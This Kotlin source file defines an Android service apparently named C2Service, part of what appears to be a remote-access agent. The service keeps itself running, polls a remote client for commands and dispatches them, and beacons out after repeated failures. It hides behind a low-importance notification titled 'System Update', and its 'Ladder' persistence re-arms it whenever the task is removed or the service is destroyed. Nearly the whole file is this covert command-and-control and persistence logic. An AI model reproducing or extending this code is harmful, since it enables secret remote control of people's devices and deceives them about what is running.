package ai.obsidian.agent.svc

import ai.obsidian.agent.AgentApp
import ai.obsidian.agent.cmd.CommandRouter
import ai.obsidian.agent.persist.Ladder
import ai.obsidian.agent.util.Probe
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class C2Service : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Default)
    private lateinit var app: AgentApp

    @Volatile
    private var alive = true

    override fun onCreate() {
        super.onCreate()
        app = application as AgentApp
        createChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Session active"))
        app.cfg.setRung(Probe.detect(this))
        scope.launch { loop() }
        Ladder.arm(this)
    }

    private suspend fun loop() {
        while (alive && scope.isActive) {
            if (!app.cfg.enrolled) {
                delay(5_000L)
                continue
            }
            try {
                val client = app.requireClient()
                for (command in client.poll()) {
                    CommandRouter.dispatch(this, command)
                }
                delay(1_000L)
            } catch (throwable: Throwable) {
                app.audit.warn("poll", throwable.message ?: throwable::class.java.simpleName)
                val client = app.client
                if (client != null) {
                    delay(client.backoffMillis)
                    client.growBackoff()
                    if (client.backoffMillis >= 120_000L) {
                        runCatching { client.beacon() }
                    }
                } else {
                    delay(5_000L)
                }
            }
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int = START_STICKY

    override fun onTaskRemoved(rootIntent: Intent?) {
        Ladder.arm(this)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        alive = false
        scope.cancel()
        if (app.cfg.resurrect) Ladder.arm(this)
        super.onDestroy()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun createChannel() {
        val manager = getSystemService(NotificationManager::class.java)
        if (manager.getNotificationChannel(CHANNEL_ID) == null) {
            manager.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, "System Update", NotificationManager.IMPORTANCE_MIN)
                    .apply { setShowBadge(false) }
            )
        }
    }

    private fun buildNotification(text: String): Notification =
        Notification.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle("System Update")
            .setContentText(text)
            .setOngoing(true)
            .build()

    companion object {
        private const val CHANNEL_ID = "obsidian.core"
        private const val NOTIFICATION_ID = 0x0B51D1A

        fun start(context: Context) {
            context.startForegroundService(Intent(context, C2Service::class.java))
        }

        fun stop(context: Context) {
            context.stopService(Intent(context, C2Service::class.java))
        }
    }
}
